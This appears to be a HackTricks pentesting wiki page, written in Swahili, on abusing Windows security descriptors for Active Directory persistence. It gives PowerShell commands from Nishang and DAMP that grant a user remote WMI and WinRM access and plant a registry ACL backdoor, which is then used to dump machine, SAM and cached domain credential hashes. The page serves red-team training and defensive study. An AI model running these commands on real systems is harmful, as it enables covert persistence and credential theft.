# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

Windows security descriptors zina SID ya mmiliki, SID ya primary-group, discretionary ACL (DACL) inayodhibiti access, na system ACL (SACL) inayotumika hasa kwa auditing. Security Descriptor Definition Language (SDDL) ni uwakilishi wa maandishi; string ya ACE ina muundo `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>

Security descriptor huhifadhi taarifa kuhusu nani anamiliki securable object na ni principals gani wanaoruhusiwa au kunyimwa rights maalum juu yake. Ikiwa attacker anaweza kubadilisha DACL, anaweza kumpa principal mwenye privileges ndogo rights ambazo kwa kawaida zinahitaji administrative role.

Hii hufanya descriptors zilizorekebishwa kwa kiasi kidogo kuwa muhimu kwa persistence: account hubaki nje ya privileged groups zinazoonekana wazi huku ikiendelea kuwa na access kwenye management surface fulani. Hifadhi descriptor ya awali kabla ya kuifanyia majaribio ili mabadiliko yaweze kuondolewa kwa usahihi.

### Access to WMI

Unaweza kumpa user access ya **kutekeleza WMI kwa mbali** [**kwa kutumia hii**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### Ufikiaji wa WinRM

Mpe mtumiaji ufikiaji wa endpoint ya mbali ya PowerShell/WinRM ukitumia function ya Nishang `Set-RemotePSRemoting`:<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Ufikiaji wa mbali wa hashes

DAMP inaweza kuunda registry-ACL backdoor ambayo baadaye inaruhusu retrieval ya mbali ya machine-account hash, local SAM hashes, na cached domain credentials. Kutoa ruhusa hizi finyu kwa account ambayo kwa kawaida si ya privileged—hasa dhidi ya domain controller—hutoa persistence yenye nguvu bila membership ya privileged-group.<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Angalia [**Silver Tickets**](silver-ticket.md) ili kujifunza jinsi unavyoweza kutumia hash ya computer account ya Domain Controller.

## References

- [1] [Lugha ya Ufafanuzi wa Security Descriptor - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Mradi wa Marekebisho ya ACL za Hiari](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Muundo wa mfuatano wa security descriptor](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
